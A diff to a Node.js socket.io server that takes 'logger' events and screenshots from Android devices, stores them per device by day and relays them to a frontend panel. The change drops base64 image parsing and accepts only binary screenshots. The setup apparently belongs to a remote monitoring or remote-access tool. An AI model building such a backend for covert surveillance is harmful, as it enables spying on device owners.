@@ -229,47 +229,18 @@ androidIo.on("connection", async (socket) => {
                 // Update device last seen
                 device.lastSeen = Date.now();
                 
-                // Check if message contains embedded image (format: text<<IMAGE>>base64)
-                let logText = data;
-                let embeddedImageFilename = null;
-                
-                // Check if message contains embedded image
-                if (data && typeof data === 'string' && data.includes('<<IMAGE>>')) {
-                    const parts = data.split('<<IMAGE>>');
-                    logText = parts[0];
-                    const embeddedImage = parts[1];
-                    
-                    console.log(chalk.green(`[i] Logger event with embedded image from device ${deviceUuid}`));
-                    
-                    // Save the embedded image using helper function
-                    if (embeddedImage && embeddedImage.length > 0) {
-                        const buffer = Buffer.from(embeddedImage, 'base64');
-                        embeddedImageFilename = await saveScreenshot(buffer, deviceUuid);
-                    }
-                } else {
-                    console.log(chalk.green(`[i] Logger event from device ${deviceUuid}: ${logText}`));
-                }
+                console.log(chalk.green(`[i] Logger event from device ${deviceUuid}: ${data}`));
 
-                // Determine what to store in logs and emit to frontend
-                if (embeddedImageFilename) {
-                    console.log(chalk.green(`[+] Sending logger event with image to frontend: ${embeddedImageFilename}`));
-                    device.logs.push({ timestamp: Date.now(), log: logText, image: embeddedImageFilename });
-                    frontendIo.emit("logger", { 
-                        device: deviceUuid, 
-                        log: logText,
-                        image: embeddedImageFilename
-                    });
-                } else {
-                    device.logs.push({ timestamp: Date.now(), log: data });
-                    frontendIo.emit("logger", { device: deviceUuid, log: data });
-                }
+                // Store in logs and emit to frontend
+                device.logs.push({ timestamp: Date.now(), log: data });
+                frontendIo.emit("logger", { device: deviceUuid, log: data });
 
                 // Store in DB
                 const today = new Date().toISOString().split('T')[0];
                 const row = await db.get('SELECT logs_data FROM device_daily_logs WHERE device_uuid = ? AND date = ?', deviceUuid, today);
                 let existingLogs = row?.logs_data || '[]';
                 const logsArray = JSON.parse(existingLogs);
-                logsArray.push({ timestamp: Date.now(), log: logText });
+                logsArray.push({ timestamp: Date.now(), log: data });
 
                 await db.run(
                     'INSERT OR REPLACE INTO device_daily_logs (device_uuid, date, logs_data, updated_at) VALUES (?, ?, ?, ?)',
@@ -295,48 +266,30 @@ androidIo.on("connection", async (socket) => {
 
             try {
                 let buffer;
-                let formatDetected = 'unknown';
                 
-                // Handle different data formats from Android
-                // Try binary first, then fallback to base64
-                
-                // 1. Try Buffer (already decoded)
+                // Only accept binary data (Buffer, TypedArray, or ArrayBuffer)
                 if (Buffer.isBuffer(data)) {
                     buffer = data;
-                    formatDetected = 'Buffer';
-                }
-                // 2. Try TypedArray like Uint8Array
+                } 
                 else if (ArrayBuffer.isView(data)) {
                     buffer = Buffer.from(data);
-                    formatDetected = 'TypedArray';
                 }
-                // 3. Try raw ArrayBuffer
                 else if (data instanceof ArrayBuffer) {
                     buffer = Buffer.from(new Uint8Array(data));
-                    formatDetected = 'ArrayBuffer';
                 }
-                // 4. Try Java array serialized as regular array
                 else if (data && typeof data === 'object' && Array.isArray(data)) {
+                    // Java arrays serialized as regular arrays
                     buffer = Buffer.from(data);
-                    formatDetected = 'JavaArray';
                 }
-                // 5. Fallback: try as base64 string
-                else if (typeof data === 'string') {
-                    // Try to decode as base64
-                    if (data.includes('<<IMAGE>>')) {
-                        throw new Error('Invalid screenshot data: appears to be logger message');
-                    }
-                    buffer = Buffer.from(data, 'base64');
-                    formatDetected = 'Base64';
-                } else {
-                    throw new Error('Invalid image data: unknown format, got ' + typeof data);
+                else {
+                    throw new Error('Invalid screenshot data: expected binary, got ' + typeof data);
                 }
                 
-                console.log(chalk.blue(`[i] Screenshot format detected: ${formatDetected}, size: ${buffer.length} bytes`));
-                
-                if (buffer.length === 0) {
+                if (!buffer || buffer.length === 0) {
                     throw new Error('Empty image data');
                 }
+                
+                console.log(chalk.green(`[+] Screenshot received from device ${deviceUuid}, size: ${buffer.length} bytes`));
 
                 // Update device last seen
                 const device = devices.get(deviceUuid);
